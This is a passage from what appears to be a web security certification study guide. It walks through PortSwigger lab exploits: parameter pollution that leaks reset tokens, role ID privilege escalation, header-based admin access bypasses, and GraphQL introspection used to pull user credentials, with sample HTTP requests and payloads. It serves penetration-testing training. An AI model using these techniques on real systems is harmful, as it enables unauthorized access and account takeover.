<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">API Reset Password Parameter Pollution</h3><a id="user-content-api-reset-password-parameter-pollution" class="anchor" aria-label="Permalink: API Reset Password Parameter Pollution" href="#api-reset-password-parameter-pollution"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Notice the reset password API function uses parameter in POST body for username. To <em><strong>identify</strong></em> aditional hidden parameters for the API function insert random parameter <code>&amp;x=y</code> to observe error message leaking information of positive result.
URL encode the random parameter and add it to current POST body parameters:</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="username=administrator%26x=y"><pre class="notranslate"><code>username=administrator%26x=y
</code></pre></div>
<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">URL Encode Character Table</h4><a id="user-content-url-encode-character-table" class="anchor" aria-label="Permalink: URL Encode Character Table" href="#url-encode-character-table"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<ul dir="auto">
<li><code>%3F</code> - <code>?</code></li>
<li><code>%3E</code> - <code>&gt;</code></li>
<li><code>%3D</code> - <code>=</code></li>
<li><code>%3C</code> - <code>&lt;</code></li>
<li><code>%3B</code> - <code>;</code></li>
<li><code>%2C</code> - ','</li>
<li><code>%28</code> - <code>(</code></li>
<li><code>%29</code> - <code>)</code></li>
<li><code>%27</code> - <code>'</code></li>
<li><code>%26</code> - <code>&amp;</code> <a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/delimiters.txt">delimiter</a> between different parameters</li>
<li><code>%25</code> - <code>%</code></li>
<li><code>%24</code> - <code>$</code></li>
<li><code>%23</code> - <code>#</code> fragment identifier</li>
<li><code>%22</code> - <code>"</code></li>
<li><code>%2F</code> - <code>/</code></li>
<li><code>%27</code> - back tick</li>
</ul>
<blockquote>
<p dir="auto">Based on the response there is possible second parameter named <code>field</code> and reviewing the JavaScript source code there is <code>reset_token</code> parameter.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/api-code-review-forgetpassword.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/api-code-review-forgetpassword.png" alt="api-code-review-forgetpassword" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Adding the additional parameter <code>field</code> with variable <code>reset_token</code> in the POST request, leak the senitive information to reset password token.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/api-resetpassword-leak-token.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/api-resetpassword-leak-token.png" alt="api-resetpassword-leak-token" style="max-width: 100%;"></a></p>
<p dir="auto">Browsing to the target URL and adding the stolen reset token, and change the <code>administrator</code> or <code>carlos</code> user password to gain access.</p>
<p dir="auto"><a href="https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string" rel="nofollow">PortSwigger Lab: Exploiting server-side parameter pollution in a query string</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Access Control</h2><a id="user-content-access-control" class="anchor" aria-label="Permalink: Access Control" href="#access-control"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#privesc-json-roleid">JSON roleid PrivEsc</a><br>
<a href="#original-url">Original URL</a><br>
<a href="#drop-select-a-role">Drop Select a role</a><br>
<a href="#trace-to-admin">Trace to Admin</a><br>
<a href="https://github.com/botesjuan/cpts-quick-references/blob/main/module/Web-Attacks.md#idor">HTB requested I remove my write-up for CPTS Skills assessments - IDOR</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">PrivEsc JSON RoleId</h3><a id="user-content-privesc-json-roleid" class="anchor" aria-label="Permalink: PrivEsc JSON RoleId" href="#privesc-json-roleid"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Access control to the admin interface is based on user roles, and this can lead to privilege escalation or access control (IDOR) security vulnerability.</p>
</blockquote>
<blockquote>
<p dir="auto">Capture current logged in user email change email submission request and send to <strong>Intruder</strong>, then add <code>"roleid":32</code> into the JSON body of the request, and fuzz the possible <code>roleid</code> value for administrator access role.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST /my-account/change-email HTTP/1.1
Host: TARGET.net
Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
Content-Length: 48
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Connection: close

{
 &quot;csrf&quot;:&quot;u4e8f4kc84md743ka04lfos84&quot;,
 &quot;email&quot;:&quot;carlos@server.net&quot;,
 &quot;roleid&quot;: 42
}"><pre>POST /my-account/change-email HTTP/1.1
Host: TARGET.net
Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
Content-Length: 48
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Connection: close

{
 "csrf":"u4e8f4kc84md743ka04lfos84",
 "email":"carlos@server.net",
 "roleid": 42
}</pre></div>
<blockquote>
<p dir="auto">The Hitchhiker's Guide to the Galaxy answer was <a href="https://en.wikipedia.org/wiki/Phrases_from_The_Hitchhiker%27s_Guide_to_the_Galaxy#42_Puzzle" rel="nofollow">42</a></p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/intruder-payload-positions.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/intruder-payload-positions.png" alt="Intruder Payload set to identify Admin role ID" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Attacker <em><strong>identify</strong></em> the possible role ID of administrator role and then send this request with updated roleId to privilege escalate the current logged in user to the access role of administrator.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/admin-roleid-privesc.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/admin-roleid-privesc.png" alt="Attack identify Admin role ID" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile" rel="nofollow">PortSwigger Lab: User role can be modified in user profile</a></p>
<blockquote>
<p dir="auto">See <a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#exploiting-a-mass-assignment">API Mass assignment lab exercises</a> to alter JSON values by inserting additional fields in JSON POST data.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Drop Select a role</h3><a id="user-content-drop-select-a-role" class="anchor" aria-label="Permalink: Drop Select a role" href="#drop-select-a-role"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Escalation to administrator is sometimes controlled by a role selector GET request, by <strong>dropping</strong> the <code>Please select a role</code> GET request before it is presented to the user, the default role of <strong>admin</strong> is selected by back-end and access is granted to the admin portal.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/select-a-role.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/select-a-role.png" alt="Select a role" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine" rel="nofollow">PortSwigger Lab: Authentication bypass via flawed state machine</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Original URL</h3><a id="user-content-original-url" class="anchor" aria-label="Permalink: Original URL" href="#original-url"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Admin portal only accessible from internal. <em><strong>Identify</strong></em> if access control can be bypassed using header <code>X-Original-URL</code>, observe different response to <code>/admin</code> endpoint requests depending on header value.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="X-Original-URL: /admin"><pre class="notranslate"><code>X-Original-URL: /admin
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/x-original-url.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/x-original-url.png" alt="x-original-url" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented" rel="nofollow">PortSwigger Lab: URL-based access control can be circumvented</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Trace to Admin</h3><a id="user-content-trace-to-admin" class="anchor" aria-label="Permalink: Trace to Admin" href="#trace-to-admin"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Unable to reach <code>/admin</code> portal, but when changing the GET request to <code>TRACE /admin</code> this response contain an <code>X-Custom-IP-Authorization: </code> header.<br>
Use the <em><strong>identified</strong></em> header to by access control to the admin authentication.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/trace-info.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/trace-info.png" alt="trace info" style="max-width: 100%;"></a></p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="GET /admin HTTP/2
Host: TARGET.net
X-Custom-Ip-Authorization: 127.0.0.1
Cookie: session=2ybmTxFLPlisA6GZvcw22Mvc29jYVuJm"><pre class="notranslate"><code>GET /admin HTTP/2
Host: TARGET.net
X-Custom-Ip-Authorization: 127.0.0.1
Cookie: session=2ybmTxFLPlisA6GZvcw22Mvc29jYVuJm
</code></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass" rel="nofollow">PortSwigger Lab: Authentication bypass via information disclosure</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">GraphQL API</h2><a id="user-content-graphql-api" class="anchor" aria-label="Permalink: GraphQL API" href="#graphql-api"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#identify-graphql-api">Identify GraphQL API</a><br>
<a href="#graphql-reveal-creds">GraphQL Reveal Credentials</a><br>
<a href="#graphql-brute-force">GraphQL Brute Force</a><br>
<a href="#graphql-voyager">GraphQL Voyager Visualize attack paths</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Identify GraphQL API</h3><a id="user-content-identify-graphql-api" class="anchor" aria-label="Permalink: Identify GraphQL API" href="#identify-graphql-api"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">To <em><strong>identify</strong></em> if there is hidden GraphQL API endpoint send an invalid GET request endpoint and observe message <code>Not Found</code>, but when sending <code>/api</code> the response is <code>Query not present</code>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-api-identify.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-api-identify.png" alt="graphql API identify" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Enumeration of the GraphQL API endpoint require testing with a universal query.<br>
Modify GET request with query as a URL parameter <code>/api?query=query{__typename}</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">The below response validate the <em><strong>identity</strong></em> of GraphQL endpoint:</p>
</blockquote>
<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="{
  &quot;data&quot;: {
	&quot;__typename&quot;: &quot;query&quot;
  }
}"><pre>{
  <span class="pl-ent">"data"</span>: {
	<span class="pl-ent">"__typename"</span>: <span class="pl-s"><span class="pl-pds">"</span>query<span class="pl-pds">"</span></span>
  }
}</pre></div>
<blockquote>
<p dir="auto">Check introspection, with new request URL-encoded introspection query as a query parameter.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A"><pre>/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-api-introspection-query.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-api-introspection-query.png" alt="graphql-api-introspection-query.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Bypass introspection protection matching the <strong>regex</strong> filters, and modify the query to include a <code>%0a</code> newline character after <code>__schema</code> and resend.</p>
</blockquote>
<blockquote>
<p dir="auto">Save the introspection response to file as <code>graphql.json</code>, and remove HTTP headers from the saved response file leaving only body.</p>
</blockquote>
<blockquote>
<p dir="auto">On the InQL Scanner tab, load the file <code>graphql.json</code> and enter to scan API endpoint.<br>
Expand scan results for the schema and find the <code>getUser</code> query.<br>
In Repeater, copy and paste the getUser query as parameter and send it to the API endpoint discovered but first URL encode all characters.</p>
</blockquote>
<blockquote>
<p dir="auto">Test alternative user IDs until the API confirms <code>carlos</code> user ID as 3.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-api-getuser-sensitivedata.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-api-getuser-sensitivedata.png" alt="graphql-api-getuser-sensitivedata.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">This give you sensitive information for a user on the system such as login token, login password information, etc.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint" rel="nofollow">PortSwigger Lab: Finding a hidden GraphQL endpoint</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">GraphQL Reveal Creds</h3><a id="user-content-graphql-reveal-creds" class="anchor" aria-label="Permalink: GraphQL Reveal Creds" href="#graphql-reveal-creds"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Intercept the login POST request to the target. <em><strong>Identify</strong></em> the GraphQL mutation contain the username and password.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-identify.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-identify.png" alt="graphql-identify" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Copy the URL of the <code>/graphql/v1</code> POST request and past into the <em><strong>InQL Scanner</strong></em> tab to scan API.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-scanner.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-scanner.png" alt="graphql-scanner.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">There is a getUser query that returns a user's username and password. This query fetches the relevant user information via a direct reference to an id number.</p>
</blockquote>
<blockquote>
<p dir="auto">Modify a request by replacing the inQL tab query value to the below discovered <code>getuser</code> query from scanner.<br>
In the POST JSON body remove the <code>operationName</code> property and value.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/graphql-modify-request.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/graphql-modify-request.png" alt="graphql-modify-request.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Log in to the site as the administrator, and gain access to the Admin panel.</p>
</blockquote>
